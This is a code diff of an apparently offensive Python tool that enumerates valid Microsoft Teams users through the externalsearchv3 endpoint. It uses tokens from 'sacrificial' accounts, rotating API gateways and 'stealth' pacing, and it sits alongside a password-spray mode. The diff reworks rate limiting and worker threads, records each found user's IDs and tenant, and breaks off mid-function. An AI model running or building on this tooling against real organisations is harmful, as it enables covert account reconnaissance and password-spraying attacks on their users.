@@ -15,9 +15,10 @@ import json
 import re
 import requests
 import itertools
+import queue
 import subprocess
 from pathlib import Path
-from concurrent.futures import ThreadPoolExecutor, as_completed, wait, FIRST_COMPLETED
+from concurrent.futures import ThreadPoolExecutor, as_completed
 from datetime import datetime, timezone
 from urllib.parse import urlparse
 
@@ -49,18 +50,16 @@ PACE_SETTINGS = {
 }
 
 # Enumerate pacing (separate from spray — enum is read-only, no lockout risk)
-# Teams API throttles at ~50 req/s PER TOKEN regardless of source IP.
-# Actual request rate is controlled by TokenBucketRateLimiter inside enumerate_user,
-# not by submission delay. Workers control HTTP concurrency only.
-# Add more sacrificial accounts (--sac-accounts) to scale throughput linearly.
-TEAMS_ENUM_RATE_PER_TOKEN = 15.0  # req/s per token; Teams search API throttles above ~20/s
+# Teams API throttles per token. Each token gets dedicated worker threads with
+# an IntervalTimer for fixed-rate spacing. Add more sacrificial accounts to scale.
+TEAMS_ENUM_RATE_PER_TOKEN = 10.0  # req/s per token; smooth interval spacing avoids bursts
 
 ENUM_PACE_SETTINGS = {
-    "high":    {"workers": 30, "delay": 0, "jitter": 0},
-    "medium":  {"workers": 20, "delay": 0, "jitter": 0},
-    "mid":     {"workers": 20, "delay": 0, "jitter": 0},
-    "low":     {"workers": 15, "delay": 0, "jitter": 0},
-    "stealth": {"workers": 5,  "delay": 0.5, "jitter": 20},
+    "high":    {"rate": 15, "threads_per_token": 8},
+    "medium":  {"rate": 10, "threads_per_token": 5},
+    "mid":     {"rate": 10, "threads_per_token": 5},
+    "low":     {"rate": 5,  "threads_per_token": 3},
+    "stealth": {"rate": 1,  "threads_per_token": 1},
 }
 
 # Smart Lockout
@@ -173,86 +172,49 @@ class APIMManager:
             self._last_url = next_url
             return next_url
 
-class TokenBucketRateLimiter:
+class IntervalTimer:
     """
-    Thread-safe token bucket rate limiter with adaptive backoff.
-    Allows up to `rate` acquisitions per second; blocks callers when the bucket is empty.
-    On 429s, call throttle() to temporarily reduce the rate, then recover over time.
+    Ensures requests are spaced at least `interval` seconds apart.
+    Multiple threads share one timer per token. The timer serializes
+    request starts at a fixed rate regardless of thread count or latency.
     """
-    def __init__(self, rate, max_burst=1.0):
-        self._base_rate = float(rate)
-        self._rate = float(rate)
-        self._tokens = max_burst      # start with small burst to avoid initial spike
-        self._max_burst = max_burst
-        self._last_refill = time.monotonic()
+    __slots__ = ("interval", "_next_slot", "_lock")
+
+    def __init__(self, rate):
+        self.interval = 1.0 / rate
+        self._next_slot = time.monotonic()
         self._lock = threading.Lock()
-        self._throttle_count = 0
 
-    def acquire(self):
-        """Block until a token is available, then consume one."""
-        while True:
-            with self._lock:
-                now = time.monotonic()
-                elapsed = now - self._last_refill
-                self._tokens = min(self._max_burst, self._tokens + elapsed * self._rate)
-                self._last_refill = now
-                if self._tokens >= 1.0:
-                    self._tokens -= 1.0
-                    return
-                wait = (1.0 - self._tokens) / self._rate
-            time.sleep(wait)
-
-    def throttle(self):
-        """Reduce rate after a 429. Cuts rate by 25% each time, minimum 10 req/s."""
+    def wait(self):
+        """Block until the next rate-limit slot is available."""
         with self._lock:
-            self._throttle_count += 1
-            self._rate = max(10.0, self._rate * 0.75)
-            self._tokens = 0  # drain bucket to enforce immediate slowdown
-
-    def recover(self):
-        """Gradually recover rate toward base after successful requests."""
-        with self._lock:
-            if self._rate < self._base_rate:
-                # Recover ~1% per success — fast enough to matter over hundreds of requests
-                self._rate = min(self._base_rate, self._rate * 1.02)
-                if self._rate >= self._base_rate * 0.98:
-                    self._rate = self._base_rate
-
-    @property
-    def current_rate(self):
-        return self._rate
-
-    def set_rate(self, new_rate):
-        with self._lock:
-            self._base_rate = float(new_rate)
-            self._rate = float(new_rate)
-            self._tokens = min(self._tokens, self._max_burst)
+            now = time.monotonic()
+            if now < self._next_slot:
+                wait_time = self._next_slot - now
+                self._next_slot += self.interval
+            else:
+                wait_time = 0
+                self._next_slot = now + self.interval
+        if wait_time > 0:
+            time.sleep(wait_time)
 
 
 class _SacToken:
     """
     Holds auth state for a single sacrificial account:
-    bearer token, skype token, credentials (for re-auth), and a per-token rate limiter.
+    bearer token, skype token, credentials (for re-auth), and a per-token
+    IntervalTimer for rate spacing.
     """
-    __slots__ = ("bearer", "skype", "username", "password", "rate_limiter",
-                 "_cooldown_until", "_cd_lock")
+    __slots__ = ("bearer", "skype", "username", "password", "timer",
+                 "reauth_lock")
 
-    def __init__(self, bearer, skype, username, password=""):
+    def __init__(self, bearer, skype, username, password="", rate=None):
         self.bearer = bearer
         self.skype = skype
         self.username = username
         self.password = password
-        self.rate_limiter = TokenBucketRateLimiter(TEAMS_ENUM_RATE_PER_TOKEN)
-        self._cooldown_until = 0.0
-        self._cd_lock = threading.Lock()
-
-    @property
-    def cooldown_remaining(self):
-        return max(0.0, self._cooldown_until - time.monotonic())
-
-    def set_cooldown(self, seconds):
-        with self._cd_lock:
-            self._cooldown_until = time.monotonic() + seconds
+        self.timer = IntervalTimer(rate or TEAMS_ENUM_RATE_PER_TOKEN)
+        self.reauth_lock = threading.Lock()
 
 
 class TeamsAPIMManager:
@@ -601,10 +563,9 @@ class TeamsEnumerator:
         self._sac_user = None
         self._sac_pass = None
         self._tenant = "common"
-        # Multi-token pool — each _SacToken has its own rate limiter
+        # Multi-token pool — each _SacToken has its own IntervalTimer
         self._token_pool = []          # list[_SacToken]
         self._pool_lock = threading.Lock()
-        self._pool_idx = 0
         self._pending_bearer = None
         # Shared session with large connection pool for TCP reuse
         adapter = requests.adapters.HTTPAdapter(
@@ -616,27 +577,15 @@ class TeamsEnumerator:
         self._session.mount("https://", adapter)
         self._session.mount("http://", adapter)
 
-    def _pick_token(self):
-        """
-        Round-robin token selection, skipping tokens in 429 cooldown.
-        Falls back to the token with the shortest remaining cooldown if all are throttled.
-        """
-        with self._pool_lock:
-            if not self._token_pool:
-                return None
-            ready = [e for e in self._token_pool if e.skype]
-            if not ready:
-                return None
-            if len(ready) == 1:
-                return ready[0]
-            for _ in range(len(ready)):
-                idx = self._pool_idx % len(ready)
-                self._pool_idx += 1
-                entry = ready[idx]
-                if entry.cooldown_remaining == 0:
-                    return entry
-            # All cooling down — return the one with least wait
-            return min(ready, key=lambda e: e.cooldown_remaining)
+    def _build_enum_url(self, email):
+        """Build the Teams externalsearchv3 URL for a candidate email."""
+        if self.teams_apim_manager:
+            gw = self.teams_apim_manager.get_next_url()
+            if not gw.endswith("/"):
+                gw += "/"
+            return f"{gw}{self.region}/beta/users/{email}/externalsearchv3", urlparse(gw).netloc
+        else:
+            return f"https://teams.microsoft.com/api/mt/{self.region}/beta/users/{email}/externalsearchv3", "direct"
 
     def _build_headers_for_token(self, token_entry):
         """Build Teams API headers scoped to a specific sacrificial token."""
@@ -760,7 +709,7 @@ class TeamsEnumerator:
                     with self._pool_lock:
                         if pending and pending[0] == self.bearer_token:
                             self._token_pool.append(
-                                _SacToken(self.bearer_token, skype_token, pending[1], pending[2])
+                                _SacToken(self.bearer_token, skype_token, pending[1], pending[2], rate=TEAMS_ENUM_RATE_PER_TOKEN)
                             )
                             self._pending_bearer = None
                         else:
@@ -790,14 +739,206 @@ class TeamsEnumerator:
             print_error(f"Skype token request failed: {e}")
             return False
 
+    def _make_enum_request(self, email, token_entry):
+        """
+        Make a single enumeration request with a specific token.
+        Returns a result dict. No retries, no rate limiting — caller handles that.
+        """
+        result = {
+            "email": email, "valid": False, "object_id": None,
+            "display_name": None, "upn": None, "tenant_id": None,
+            "mri": None, "gateway": None, "error": None,
+            "token_expired": False, "retry_after": 0,
+        }
+
+        url, gw_host = self._build_enum_url(email)
+        result["gateway"] = gw_host
+        headers = self._build_headers_for_token(token_entry)
+
+        try:
+            resp = self._session.get(url, headers=headers, timeout=10, verify=True)
+        except requests.RequestException as e:
+            result["error"] = str(e)
+            return result
+
+        if resp.status_code == 401:
+            resp_text = resp.text[:300] if resp.text else ""
+            if "Access denied" in resp_text or "subscription" in resp_text.lower():
+                result["error"] = f"APIM gateway error: {resp_text[:150]}"
+            else:
+                result["error"] = "HTTP 401"
+                result["token_expired"] = True
+            return result
+
+        if resp.status_code == 429:
+            result["error"] = "HTTP 429"
+            result["retry_after"] = min(int(resp.headers.get("Retry-After", 10)), 60)
+            return result
+
+        if resp.status_code == 200:
+            body = resp.text
+            if "tenantId" in body:
+                try:
+                    users_found = resp.json()
+                    if isinstance(users_found, list) and len(users_found) > 0:
+                        for user_obj in users_found:
+                            tenant_id = user_obj.get("tenantId")
+                            coex_mode = (user_obj.get("featureSettings") or {}).get("coExistenceMode", "")
+                            display_name = user_obj.get("displayName", "")
+                            upn = user_obj.get("userPrincipalName", "")
+
+                            if tenant_id:
+                                result["valid"] = True
+                                result["object_id"] = user_obj.get("objectId")
+                                result["display_name"] = display_name
+                                result["upn"] = upn
+                                result["tenant_id"] = tenant_id
+                                result["mri"] = user_obj.get("mri")
+                                break
+                except (ValueError, KeyError):
+                    pass
+            return result
+
+        if resp.status_code == 403:
+            try:
+                err_body = resp.json()
+                if err_body.get("errorCode") == "Forbidden":
+                    result["valid"] = True
+                    result["tenant_id"] = "forbidden-enum"
+            except (ValueError, KeyError):
+                pass
+            if not result["valid"]:
+                result["error"] = f"HTTP 403: {resp.text[:150]}"
+            return result
+
+        result["error"] = f"HTTP {resp.status_code}: {resp.text[:150]}"
+        return result
+
+    def _reauth_token(self, token_entry):
+        """
+        Re-authenticate a specific token. Uses global _reauth_lock to avoid
+        concurrent writes to instance auth state.
+        Returns True on success.
+        """
+        with self._reauth_lock:
+            ok = self.authenticate_sacrificial(
+                token_entry.username, token_entry.password, self._tenant
+            )
+            if not ok:
+                return False
+            new_bearer = self.bearer_token
+            ok = self.acquire_skype_token()
+            if not ok:
+                return False
+            new_skype = self.skype_token
+            token_entry.bearer = new_bearer
+            token_entry.skype = new_skype
+            return True
+
+    def _token_worker(self, token_entry, user_queue, results_lock,
+                      valid_users_set, valid_mris, counters, counters_lock,
+                      logger, progress, stop_event):
+        """
+        Dedicated worker thread for a single token. Pulls users from the
+        shared queue, makes enumeration requests at the token's rate, and
+        handles 429/401 inline.
+        """
+        MAX_ATTEMPTS = 4
+        reauth_failures = 0
+
+        while not stop_event.is_set():
+            try:
+                email = user_queue.get(timeout=2)
+            except queue.Empty:
+                break  # queue drained
+
+            result = None
+            for attempt in range(MAX_ATTEMPTS):
+                if stop_event.is_set():
+                    user_queue.task_done()
+                    return
+
+                token_entry.timer.wait()
+                result = self._make_enum_request(email, token_entry)
+
+                # Success or definitive non-error response
+                if result.get("error") is None:
+                    reauth_failures = 0
+                    break
+
+                # 429 — sleep and retry same user
+                if "429" in str(result["error"]):
+                    retry_after = result.get("retry_after", 10)
+                    with counters_lock:
+                        counters["rate_limited"] += 1
+                        rl = counters["rate_limited"]
+                    if rl == 1 or rl % 50 == 0:
+                        print_warn(f"Rate limited (429) x{rl} — backing off {retry_after}s "
+                                   f"[{token_entry.username}]")
+                        sys.stdout.flush()
+                    time.sleep(retry_after)
+                    continue
+
+                # 401 — re-auth this token and retry
+                if result.get("token_expired"):
+                    if reauth_failures >= 3:
+                        print_error(f"Token {token_entry.username} failed 3 consecutive "
+                                    "re-auths — thread exiting")
+                        user_queue.task_done()
+                        return
+                    print_warn(f"Token expired for {token_entry.username} — re-authenticating...")
+                    if self._reauth_token(token_entry):
+                        reauth_failures = 0
+                    else:
+                        reauth_failures += 1
+                    continue
+
+                # Connection error / APIM error — wait briefly and retry
+                if attempt < MAX_ATTEMPTS - 1:
+                    time.sleep(1)
+                    continue
+
+            # Process final result
+            with counters_lock:
+                counters["completed"] += 1
+
+            if result and result.get("error") is None:
+                with counters_lock:
+                    counters["checked"] += 1
+
+                if result["valid"]:
+                    with results_lock:
+                        valid_users_set.add(email)
+                        if result.get("mri"):
+                            valid_mris[email] = result["mri"]
+
+                    display = result.get("display_name", "")
+                    suffix = f" ({display})" if display else ""
+                    print(f"{style('[+]', TermColors.GREEN, TermColors.BOLD)} "
+                          f"{style(email, TermColors.GREEN, TermColors.BOLD)}{suffix}")
+                    sys.stdout.flush()
+
+                    logger.log_result("enumerated", email)
+                    logger.log_enum_detail({
+                        "timestamp": utc_now_str(),
+                        "email": email,
+                        "valid": True,
+                        "object_id": result.get("object_id"),
+                        "tenant_id": result.get("tenant_id"),
+                        "mri": result.get("mri"),
+                    })
+            else:
+                with counters_lock:
+                    counters["errors"] += 1
+
+            progress.increment()
+            user_queue.task_done()
+
     def verify_token(self, username=None):
         """
-        Make a lightweight Teams API call to verify the token actually works.
-        Uses the /v1/users/ME/properties endpoint which requires a valid skype token
-        but doesn't hit the search API.
-        Returns True if the token is functional, False otherwise with diagnostic info.
+        Verify a token works by making a test enumeration request.
+        Retries up to 3 times with different gateways on connection errors.
         """
-        # Find the token entry to test
         with self._pool_lock:
             if username:
                 entry = next((e for e in self._token_pool if e.username == username), None)
@@ -810,194 +951,27 @@ class TeamsEnumerator:
             print_error(f"Token for {entry.username} has no Skype token")
             return False
 
-        # Test with a simple search for a nonsense user (won't find anyone).
-        # Retry up to 3 times with different gateways in case one is down.
-        for verify_attempt in range(3):
+        for attempt in range(3):
             test_email = f"apimspray.tokencheck.{random.randint(10000,99999)}@outlook.com"
-            if self.teams_apim_manager:
-                gw = self.teams_apim_manager.get_next_url()
-                if not gw.endswith("/"):
-                    gw += "/"
-                url = f"{gw}{self.region}/beta/users/{test_email}/externalsearchv3"
-            else:
-                url = f"https://teams.microsoft.com/api/mt/{self.region}/beta/users/{test_email}/externalsearchv3"
+            entry.timer.wait()
+            result = self._make_enum_request(test_email, entry)
 
-            headers = self._build_headers_for_token(entry)
-            entry.rate_limiter.acquire()
-            try:
-                resp = self._session.get(url, headers=headers, timeout=10, verify=True)
-                if resp.status_code == 200:
-                    print_success(f"Token verified for {entry.username} (HTTP 200)")
-                    return True
-                elif resp.status_code == 401:
-                    print_error(f"Token REJECTED for {entry.username} (HTTP 401) — account may lack a Teams license or the Skype token is invalid")
-                    print_error(f"  Bearer: {entry.bearer[:20]}...  Skype: {entry.skype[:20]}...")
-                    return False
-                elif resp.status_code == 403:
-                    print_error(f"Token FORBIDDEN for {entry.username} (HTTP 403) — account may be restricted from Teams external search")
-                    return False
-                elif resp.status_code == 429:
-                    print_warn(f"Token got rate-limited during verification (HTTP 429) — token likely valid, proceeding")
-                    return True
-                else:
-                    print_warn(f"Token verification got HTTP {resp.status_code} for {entry.username} — proceeding cautiously")
-                    print_warn(f"  Response: {resp.text[:200]}")
-                    return True
-            except requests.RequestException as e:
-                print_warn(f"Token verification attempt {verify_attempt + 1}/3 failed (gateway issue): {e}")
-                if verify_attempt < 2:
+            if result.get("error") is None:
+                print_success(f"Token verified for {entry.username} (HTTP 200)")
+                return True
+            elif result.get("token_expired"):
+                print_error(f"Token REJECTED for {entry.username} (HTTP 401)")
+                return False
+            elif "429" in str(result.get("error", "")):
+                print_warn(f"Token rate-limited during verification (HTTP 429) — likely valid")
+                return True
+            else:
+                print_warn(f"Verify attempt {attempt + 1}/3 failed: {result['error']}")
+                if attempt < 2:
                     continue
                 print_error(f"Token verification failed after 3 attempts for {entry.username}")
                 return False
         return False
-
-    def enumerate_user(self, email, fetch_presence=False, max_retries=2):
-        """
-        Check if a user exists via the Teams externalsearchv3 endpoint.
-        Uses per-token rate limiting (TokenBucketRateLimiter) to stay under the
-        Teams ~50 req/s per-token throttle. On 429, puts the offending token in
-        cooldown and retries with a different token from the pool.
-        """
-        result = {
-            "email": email,
-            "valid": False,
-            "object_id": None,
-            "display_name": None,
-            "upn": None,
-            "tenant_id": None,
-            "mri": None,
-            "out_of_office": None,
-            "presence": None,
-            "gateway": None,
-            "error": None,
-            "token_expired": False,
-            "expired_bearer": None,
-        }
-
-        def _build_url():
-            if self.teams_apim_manager:
-                gw = self.teams_apim_manager.get_next_url()
-                if not gw.endswith("/"):
-                    gw += "/"
-                url = f"{gw}{self.region}/beta/users/{email}/externalsearchv3"
-                host = urlparse(gw).netloc
-            else:
-                url = f"https://teams.microsoft.com/api/mt/{self.region}/beta/users/{email}/externalsearchv3"
-                host = "direct"
-            return url, host
-
-        for attempt in range(max_retries + 1):
-            token_entry = self._pick_token()
-            if token_entry is None:
-                result["error"] = "No tokens in pool"
-                return result
-
-            # If this token is in cooldown, wait briefly for it to clear.
-            # Stagger the wait with jitter to prevent thundering herd.
-            cd = token_entry.cooldown_remaining
-            if cd > 0:
-                jitter = random.uniform(0.1, 1.0)
-                time.sleep(min(cd + jitter, 10))
-
-            # Acquire a rate-limit slot — blocks until the per-token budget allows
-            token_entry.rate_limiter.acquire()
-
-            enum_url, gw_host = _build_url()
-            result["gateway"] = gw_host
-            headers = self._build_headers_for_token(token_entry)
-
-            try:
-                resp = self._session.get(enum_url, headers=headers, timeout=5, verify=True)
-            except requests.RequestException as e:
-                result["error"] = str(e)
-                if attempt < max_retries:
-                    continue
-                return result
-
-            if resp.status_code == 401:
-                # Log the response to help diagnose whether this is Teams or APIM rejecting us
-                resp_snippet = resp.text[:300] if resp.text else "(empty body)"
-                # Check if APIM itself is rejecting (e.g. missing subscription key)
-                is_apim_error = "Access denied" in resp_snippet or "subscription" in resp_snippet.lower()
-                if is_apim_error:
-                    result["error"] = f"HTTP 401 from APIM gateway -- {resp_snippet}"
-                    # Don't mark as token_expired — this is a gateway config issue, not a token issue
-                    if attempt < max_retries:
-                        continue
-                    return result
-                # Log once per token to avoid spam — use a set on the enumerator
-                logged_set = getattr(self, "_401_logged", set())
-                tok_id = token_entry.bearer[:16]
-                if tok_id not in logged_set:
-                    logged_set.add(tok_id)
-                    self._401_logged = logged_set
-                    print_warn(f"HTTP 401 from {gw_host} | skype={'yes' if token_entry.skype else 'NO'} | "
-                               f"url={enum_url[:120]} | resp={resp_snippet[:200]}")
-                result["error"] = "HTTP 401 -- token expired"
-                result["token_expired"] = True
-                result["expired_bearer"] = token_entry.bearer
-                return result
-
-            if resp.status_code == 429:
-                # Put this token in cooldown and return immediately — don't block
-                # this worker thread. The user goes to retry queue and will be
-                # re-checked in the next pass when tokens are out of cooldown.
-                retry_after = min(int(resp.headers.get("Retry-After", 10)), 60)
-                token_entry.set_cooldown(retry_after)
-                result["error"] = "HTTP 429 -- rate limited"
-                return result
-
-            if resp.status_code == 200:
-                body = resp.text
-                if "tenantId" in body:
-                    try:
-                        users_found = resp.json()
-                        if isinstance(users_found, list) and len(users_found) > 0:
-                            for user_obj in users_found:
-                                tenant_id = user_obj.get("tenantId")
-                                coex_mode = (user_obj.get("featureSettings") or {}).get("coExistenceMode", "")
-                                display_name = user_obj.get("displayName", "")
-                                upn = user_obj.get("userPrincipalName", "")
-
-                                if (
-                                    tenant_id is not None
-                                    and coex_mode != "Unknown"
-                                    and (display_name.lower() != email.lower() or upn.lower() == email.lower())
-                                ):
-                                    result["valid"] = True
-                                    result["object_id"] = user_obj.get("objectId")
-                                    result["display_name"] = display_name
-                                    result["upn"] = upn
-                                    result["tenant_id"] = tenant_id
-                                    result["mri"] = user_obj.get("mri")
-                                    return result
-                    except (json.JSONDecodeError, KeyError, TypeError):
-                        pass
-                return result
-
-            elif resp.status_code == 403:
-                try:
-                    err_body = resp.json()
-                    if err_body.get("errorCode") == "Forbidden":
-                        result["valid"] = True
-                        return result
-                except (json.JSONDecodeError, AttributeError):
-                    pass
-                return result
-
-            elif resp.status_code == 500:
-                if attempt < max_retries:
-                    continue
-                result["error"] = "HTTP 500"
-                return result
-
-            else:
-                if attempt < max_retries:
-                    continue
-                result["error"] = f"HTTP {resp.status_code}"
-                return result
-
-        return result
 
     def _fetch_presence(self, mri):
         """
@@ -1032,10 +1006,8 @@ class TeamsEnumerator:
     def sanity_check(self, sample_domain):
         """
         Verify enumeration works by checking a guaranteed-invalid username.
-        If it comes back valid, the method is unreliable for this tenant.
         Returns True if sanity check PASSES (enumeration is usable).
         """
-        # Generate a realistic-looking but guaranteed-nonexistent username
         first_names = ["james","mary","john","patricia","robert","jennifer","michael","linda","david","elizabeth"]
         last_names = ["smith","johnson","williams","brown","jones","garcia","miller","davis","rodriguez","martinez"]
         fake_first = random.choice(first_names)
@@ -1044,12 +1016,17 @@ class TeamsEnumerator:
         fake_user = f"{fake_first}.{fake_last}{fake_num}@{sample_domain}"
         print_info(f"Running sanity check with: {fake_user}")
 
-        # Try up to 3 times — sanity check should get a definitive answer
+        token_entry = self._token_pool[0] if self._token_pool else None
+        if not token_entry:
+            print_error("No tokens available for sanity check")
+            return False
+
         for attempt in range(3):
-            result = self.enumerate_user(fake_user, max_retries=0)
+            token_entry.timer.wait()
+            result = self._make_enum_request(fake_user, token_entry)
 
             if result.get("token_expired"):
-                print_error("Sanity check got 401 -- token may be invalid for Teams API. Check sacrificial account has a Teams license.")
+                print_error("Sanity check got 401 -- token may be invalid for Teams API.")
                 return False
 
             if result.get("error"):
@@ -1059,7 +1036,7 @@ class TeamsEnumerator:
                     continue
                 else:
                     print_warn(f"Sanity check returned error after 3 attempts: {result['error']}")
-                    print_warn("Gateways may be under pressure -- expect higher retry rates during enumeration")
+                    print_warn("Gateways may be under pressure -- expect higher retry rates")
                     return True
 
             if result["valid"]:
@@ -1192,118 +1169,6 @@ def process_attempt(
         stop_event.set()
 
 
-# ============================================================================
-# ENUMERATE MODE WORKER
-# ============================================================================
-
-def process_enum_attempt(
-    email, teams_enumerator, pace_config, logger,
-    valid_users_set, valid_mris, failed_users_list, counters, counters_lock,
-    lock, stop_event,
-):
-    if stop_event.is_set():
-        return
-    result = teams_enumerator.enumerate_user(email, fetch_presence=False)
-
-    # Handle token expiry — re-authenticate the specific expired token and retry
-    if result.get("token_expired"):
-        expired_bearer = result.get("expired_bearer")
-
-        with teams_enumerator._reauth_lock:
-            # Find the expired entry (another thread may have already refreshed it)
-            expired_entry = None
-            with teams_enumerator._pool_lock:
-                for entry in teams_enumerator._token_pool:
-                    if entry.bearer == expired_bearer:
-                        expired_entry = entry
-                        break
-
-            if expired_entry and expired_entry.bearer == expired_bearer:
-                # Circuit breaker: if we already re-authed recently and the fresh
-                # token also got 401, the account is fundamentally broken — don't loop.
-                reauth_fails = getattr(teams_enumerator, "_reauth_401_count", 0)
-                if reauth_fails >= 3:
-                    print_error(f"Token for {expired_entry.username} has failed {reauth_fails} consecutive re-auths — "
-                                "account likely lacks Teams license or permissions. Removing from pool.")
-                    with teams_enumerator._pool_lock:
-                        teams_enumerator._token_pool = [e for e in teams_enumerator._token_pool if e.username != expired_entry.username]
-                        remaining = len(teams_enumerator._token_pool)
-                    if remaining == 0:
-                        print_error("No working tokens remain — stopping enumeration")
-                        stop_event.set()
-                        return
-                    print_warn(f"{remaining} token(s) remain in pool")
-                else:
-                    print_warn(f"Token expired for {expired_entry.username} — re-authenticating...")
-                    ok = teams_enumerator.authenticate_sacrificial(
-                        expired_entry.username,
-                        expired_entry.password,
-                        teams_enumerator._tenant,
-                    )
-                    if ok:
-                        skype_ok = teams_enumerator.acquire_skype_token()
-                        if skype_ok and not teams_enumerator.verify_token(expired_entry.username):
-                            teams_enumerator._reauth_401_count = reauth_fails + 1
-                            print_error(f"Fresh token for {expired_entry.username} immediately rejected by Teams API "
-                                        f"(attempt {reauth_fails + 1}/3)")
-                        elif skype_ok:
-                            teams_enumerator._reauth_401_count = 0  # Reset on success
-                    else:
-                        with teams_enumerator._pool_lock:
-                            remaining = len(teams_enumerator._token_pool)
-                        if remaining == 0:
-                            print_error("Re-authentication failed and no backup tokens — stopping enumeration")
-                            stop_event.set()
-                            return
-                        else:
-                            print_warn(f"Re-auth failed for {expired_entry.username} — continuing with remaining tokens")
-
-        # Retry with refreshed token
-        result = teams_enumerator.enumerate_user(email, fetch_presence=False)
-        if result.get("token_expired"):
-            with lock:
-                failed_users_list.append(email)
-            with counters_lock:
-                counters["errors"] += 1
-            return
-
-    # If there was an error (timeout, connection, 429, 500), track for retry
-    if result.get("error"):
-        with lock:
-            failed_users_list.append(email)
-        with counters_lock:
-            counters["errors"] += 1
-            if "429" in str(result["error"]):
-                counters["rate_limited"] += 1
-                rl_count = counters["rate_limited"]
-                # Warn periodically — first hit, then every 100
-                if rl_count == 1 or rl_count % 100 == 0:
-                    print_warn(f"Rate limited (429) — {rl_count} total so far. These will be retried in the next pass.")
-                    sys.stdout.flush()
-        return
-
-    # Definitive response — count it
-    with counters_lock:
-        counters["checked"] += 1
-
-    if result["valid"]:
-        with lock:
-            valid_users_set.add(email)
-            if result.get("mri"):
-                valid_mris[email] = result["mri"]
-
-        print(f"{style('[+]', TermColors.GREEN, TermColors.BOLD)} {style(email, TermColors.GREEN, TermColors.BOLD)}")
-        sys.stdout.flush()
-
-        logger.log_result("enumerated", email)
-        logger.log_enum_detail({
-            "timestamp": utc_now_str(),
-            "email": email,
-            "valid": True,
-            "object_id": result.get("object_id"),
-            "tenant_id": result.get("tenant_id"),
-            "mri": result.get("mri"),
-        })
 
 
 # ============================================================================
@@ -1587,11 +1452,6 @@ def _run_enumerate(args):
 
     logger = Logger(args.output)
 
-    # Use enumerate-specific pacing (much faster than spray pacing — no lockout risk)
-    enum_pace = ENUM_PACE_SETTINGS[args.pace]
-    workers = enum_pace["workers"]
-    base_delay = enum_pace["delay"]
-
     # Collect all sacrificial accounts
     sac_accounts = []
     if args.sac_user and args.sac_pass:
@@ -1610,7 +1470,10 @@ def _run_enumerate(args):
     print_info(f"Sacrificial Accounts: {style(str(len(sac_accounts)), TermColors.CYAN, TermColors.BOLD)}")
     print_info(f"Candidate Users: {style(str(len(users)), TermColors.MAGENTA, TermColors.BOLD)}")
     print_info(f"Sacrificial Auth: {style('via APIM' if login_apim else 'direct', TermColors.MAGENTA, TermColors.BOLD)}")
-    print_info(f"Workers: {style(str(workers), TermColors.MAGENTA, TermColors.BOLD)}, Rate: {style(f'~{TEAMS_ENUM_RATE_PER_TOKEN:.0f} req/s per token', TermColors.MAGENTA, TermColors.BOLD)}")
+    enum_pace = ENUM_PACE_SETTINGS[args.pace]
+    pace_rate = enum_pace["rate"]
+    print_info(f"Pace: {style(args.pace, TermColors.MAGENTA, TermColors.BOLD)}, "
+               f"Rate: {style(f'~{pace_rate} req/s per token', TermColors.MAGENTA, TermColors.BOLD)}")
     if not args.no_presence:
         print_info(f"Presence/OOO Fetch: {style('ENABLED (post-enum pass)', TermColors.GREEN, TermColors.BOLD)}")
     else:
@@ -1648,7 +1511,7 @@ def _run_enumerate(args):
             sys.exit(1)
         print_warn(f"Removed {len(failed_usernames)} broken token(s), {token_count} remain")
 
-    effective_rate = token_count * TEAMS_ENUM_RATE_PER_TOKEN
+    effective_rate = token_count * enum_pace["rate"]
     print_success(f"Token pool ready: {style(str(token_count), TermColors.GREEN, TermColors.BOLD)} token(s) — effective rate ~{effective_rate:.0f} req/s")
 
     if not args.skip_sanity:
@@ -1660,84 +1523,65 @@ def _run_enumerate(args):
         else:
             print_warn("Cannot determine domain for sanity check -- skipping")
 
+    # Build the user queue
+    user_queue = queue.Queue()
+    for email in users:
+        user_queue.put(email)
+
+    # Determine threads per token from pace settings
+    threads_per_token = enum_pace["threads_per_token"]
+    token_rate = enum_pace["rate"]
+
+    # Set each token's timer to the pace rate
+    for entry in enumerator._token_pool:
+        entry.timer = IntervalTimer(token_rate)
+
+    total_threads = token_count * threads_per_token
+    print_info(f"Threads: {style(str(total_threads), TermColors.MAGENTA, TermColors.BOLD)} "
+               f"({threads_per_token}/token), "
+               f"Target rate: {style(f'~{effective_rate:.0f} req/s', TermColors.MAGENTA, TermColors.BOLD)}")
+
+    # Progress tracker
+    progress = ProgressTracker()
+    progress.begin_session(len(users))
+    progress.begin_round(len(users), label="Enumerating")
+
+    # Shared state
     valid_users_set = set()
     valid_mris = {}
-    lock = threading.Lock()
+    results_lock = threading.Lock()
     stop_event = threading.Event()
-
-    counters = {"submitted": 0, "completed": 0, "checked": 0, "errors": 0, "rate_limited": 0}
+    counters = {"completed": 0, "checked": 0, "errors": 0, "rate_limited": 0}
     counters_lock = threading.Lock()
 
-    # Multi-pass enumeration: fast first pass, then retry failures with lower concurrency
-    MAX_PASSES = 3
-    current_user_list = list(users)
+    # Launch per-token worker threads
+    threads = []
+    for token_entry in enumerator._token_pool:
+        for i in range(threads_per_token):
+            t = threading.Thread(
+                target=enumerator._token_worker,
+                args=(token_entry, user_queue, results_lock,
+                      valid_users_set, valid_mris, counters, counters_lock,
+                      logger, progress, stop_event),
+                daemon=True,
+                name=f"enum-{token_entry.username}-{i}",
+            )
+            t.start()
+            threads.append(t)
 
-    for pass_num in range(1, MAX_PASSES + 1):
-        if not current_user_list or stop_event.is_set():
-            break
+    # Wait for all threads to complete (with Ctrl+C support)
+    try:
+        for t in threads:
+            while t.is_alive():
+                t.join(timeout=1)
+    except KeyboardInterrupt:
+        print_warn("\nStopping enumeration...")
+        stop_event.set()
+        for t in threads:
+            t.join(timeout=3)
 
-        # Reduce concurrency on retry passes to avoid overwhelming gateways
-        if pass_num == 1:
-            pass_workers = workers
-        else:
-            pass_workers = max(10, workers // (pass_num * 2))
-
-        pass_label = f"Pass {pass_num}/{MAX_PASSES}" if MAX_PASSES > 1 else "Enumerating"
-        print_info(f"{pass_label}: {style(str(len(current_user_list)), TermColors.MAGENTA, TermColors.BOLD)} users, {style(str(pass_workers), TermColors.MAGENTA, TermColors.BOLD)} workers")
-        sys.stdout.flush()
-
-        progress_tracker = ProgressTracker()
-        progress_tracker.begin_session(len(current_user_list))
-        progress_tracker.begin_round(len(current_user_list), label=pass_label)
-
-        failed_users_list = []  # thread-safe via lock
-
-        def _make_on_done(tracker):
-            def _on_done(f):
-                with counters_lock:
-                    counters["completed"] += 1
-                try:
-                    f.result()
-                except Exception as e:
-                    print_warn(f"Enum worker error: {e}")
-                finally:
-                    tracker.increment()
-            return _on_done
-
-        on_done = _make_on_done(progress_tracker)
